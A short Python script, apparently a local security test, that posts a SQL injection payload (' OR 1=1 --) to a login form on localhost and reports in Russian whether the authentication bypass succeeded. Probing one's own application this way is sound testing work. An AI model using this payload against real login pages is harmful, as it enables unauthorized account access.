import requests as rq

url = "http://localhost:8000/login"

data = {
    "username": "' OR 1=1 --",
    "password": "wrong"
}

res = rq.post(
    url,
    data=data,
    allow_redirects=False,
    timeout=3
)

print("none" if res.status_code == 401 or res.status_code == 400 else f"Инъекция сработала. Перенаправление: {res.headers.get("Location")}")